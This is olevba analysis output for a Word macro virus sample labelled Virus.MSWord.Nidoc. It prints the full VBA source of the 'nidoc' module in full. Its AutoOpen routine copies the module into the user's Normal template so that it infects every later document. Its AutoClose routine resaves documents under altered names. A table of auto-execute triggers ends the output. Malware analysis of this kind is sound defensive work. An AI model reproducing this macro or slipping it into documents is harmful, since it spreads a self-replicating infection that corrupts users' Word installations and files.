olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nidoc-c3868f1a699b1227d3d191a6e60fbfe10ea2040d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nidoc-c3868f1a699b1227d3d191a6e60fbfe10ea2040d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO nidoc.bas 
in file: Virus.MSWord.Nidoc-c3868f1a699b1227d3d191a6e60fbfe10ea2040d - OLE stream: 'Macros/VBA/nidoc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoClose"

    normPath = NormalTemplate.Path
    nomeNorm = NormalTemplate.Name
      
    normaldoc = normPath & "\" & nomeNorm
    normdoc = normPath & "\" & "nidoc.dot"
    On Error GoTo salva
    ActiveDocument.AttachedTemplate = normdoc
    
GoTo step2
salva:
    ActiveDocument.SaveAs FileName:=normdoc, FileFormat:=wdFormatTemplate
    Application.OrganizerCopy Source:=normdoc, Destination:=NormalTemplate, Name:= _
        "nidoc", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Close
    GoTo fim
step2:
    On Error GoTo fim
    Application.OrganizerCopy Source:=normdoc, Destination:=ActiveDocument, Name:= _
        "nidoc", Object:=wdOrganizerObjectProjectItems
    
fim:
    
    ActiveDocument.AttachedTemplate = NormalTemplate
    
End Sub
Sub AutoClose()
    duplo = ActiveDocument
    d = duplo & duplo & duplo
    If ActiveDocument.Name <> "nidoc.dot" Then
        ActiveDocument.SaveAs FileName:=d
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
+----------+--------------------+---------------------------------------------+

